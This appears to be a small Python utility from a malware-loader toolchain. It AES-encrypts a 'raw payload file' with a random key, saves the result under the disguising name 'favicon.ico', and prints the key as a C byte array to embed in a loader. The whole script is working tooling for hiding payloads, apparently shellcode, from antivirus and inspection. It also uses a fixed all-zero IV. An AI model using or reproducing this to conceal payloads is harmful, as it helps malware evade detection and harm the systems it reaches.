import sys
from Crypto.Cipher import AES
from os import urandom
import hashlib

KEY = urandom(16)

def pad(s):
  padding = (AES.block_size - len(s) % AES.block_size) * chr(AES.block_size - len(s) % AES.block_size)
  return s + padding.encode()

def aesenc(plaintext, key):
  k = hashlib.sha256(key).digest()
  iv = (16 * '\x00').encode()
  plaintext = pad(plaintext)
  cipher = AES.new(k, AES.MODE_CBC, iv)

  return cipher.encrypt(bytes(plaintext))


try:
  plaintext = open(sys.argv[1], "rb").read()
except:
  print("File argument needed! %s <raw payload file>" % sys.argv[0])
  sys.exit()

ciphertext = aesenc(plaintext, KEY)
open("favicon.ico",'wb').write(ciphertext)

KEY_str = KEY.decode('latin-1')
print('AESkey[] = { 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };')